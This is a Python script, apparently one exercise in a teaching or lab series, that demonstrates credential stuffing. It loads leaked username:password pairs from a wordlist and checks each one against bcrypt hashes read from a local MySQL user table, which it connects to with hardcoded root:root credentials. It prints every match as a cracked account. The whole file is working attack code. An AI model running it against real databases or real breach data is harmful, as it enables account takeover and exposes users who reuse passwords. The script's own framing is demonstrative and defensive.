import bcrypt
import mysql.connector
from mysql.connector import Error
import os
import time

# -------------------------
# ATTACK 5 — Credential Stuffing
#
# Scenario: Attacker has a list of username:password pairs leaked
# from a DIFFERENT breach (e.g. a less secure site). They try those
# same credentials here, betting that users reuse passwords.
#
# Expected result:
#   Users who reused passwords from the breach list → CRACKED
#   Users with unique passwords                     → FAILED
#   This demonstrates why password reuse is dangerous.
# -------------------------

DB_CONFIG = {
    'host':     'localhost',
    'user':     'root',
    'password': 'root',
    'database': 'user_system'
}

SCRIPT_DIR    = os.path.dirname(os.path.abspath(__file__))
BREACHES_PATH = os.path.join(SCRIPT_DIR, "wordlists", "known_breaches.txt")

# -------------------------
# Load breach list — format: username:password
# -------------------------
def load_breach_list(path: str) -> list[tuple[str, str]]:
    if not os.path.exists(path):
        print(f"❌ Breach list not found at: {path}")
        print(f"   Make sure known_breaches.txt is in Attacks/wordlists/")
        exit(1)

    pairs = []
    with open(path, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and ":" in line:
                username, password = line.split(":", 1)
                pairs.append((username.strip(), password.strip()))

    print(f"Loaded {len(pairs)} credential pairs from breach list.")
    return pairs

# -------------------------
# Fetch all users from DB — keyed by username for fast lookup
# -------------------------
def fetch_users() -> dict[str, tuple[int, str]]:
    try:
        conn = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("SELECT userid, username, password FROM users")
        rows  = cursor.fetchall()
        users = {username: (userid, stored_hash) for userid, username, stored_hash in rows}
        print(f"Found {len(users)} users in database.\n")
        return users
    except Error as e:
        print(f"❌ Database error: {e}")
        exit(1)
    finally:
        if 'cursor' in locals(): cursor.close()
        if 'conn' in locals() and conn.is_connected(): conn.close()

# -------------------------
# Credential stuffing attack
# -------------------------
def credential_stuffing_attack(users, breach_list):
    print("=" * 60)
    print("  ATTACK 5 — Credential Stuffing")
    print("=" * 60)

    cracked        = []
    failed         = []
    not_found      = []
    total_attempts = 0
    start_time     = time.time()

    for username, password in breach_list:
        total_attempts += 1

        if username not in users:
            not_found.append(username)
            print(f"  [NO USER] {username:<30} — not in this system")
            continue

        userid, stored_hash = users[username]

        try:
            if bcrypt.checkpw(password.encode('utf-8'), stored_hash.encode('utf-8')):
                cracked.append((username, password))
                print(f"  [CRACKED] {username:<30} → {password}")
            else:
                failed.append(username)
                print(f"  [FAILED]  {username:<30} — password doesn't match")
        except Exception as e:
            failed.append(username)
            print(f"  [ERROR]   {username:<30} — {e}")

    elapsed = time.time() - start_time

    print(f"\n{'=' * 60}")
    print(f"  RESULTS")
    print(f"{'=' * 60}")
    print(f"  Cracked   : {len(cracked)} / {total_attempts}")
    print(f"  Failed    : {len(failed)} / {total_attempts}")
    print(f"  Not found : {len(not_found)} / {total_attempts}")
    print(f"  Attempts  : {total_attempts}")
    print(f"  Time      : {elapsed:.2f}s")
    print(f"{'=' * 60}")

    if cracked:
        print(f"\n  ⚠️  Cracked via credential reuse:")
        for username, password in cracked:
            print(f"     {username:<30} {password}")

    print(f"\n  KEY FINDING:")
    print(f"  Credential stuffing doesn't crack hashes at all —")
    print(f"  it exploits password reuse across sites. Even a")
    print(f"  perfectly hashed system is vulnerable if users")
    print(f"  reuse passwords from other breached services.")

if __name__ == "__main__":
    breach_list = load_breach_list(BREACHES_PATH)
    users       = fetch_users()
    credential_stuffing_attack(users, breach_list)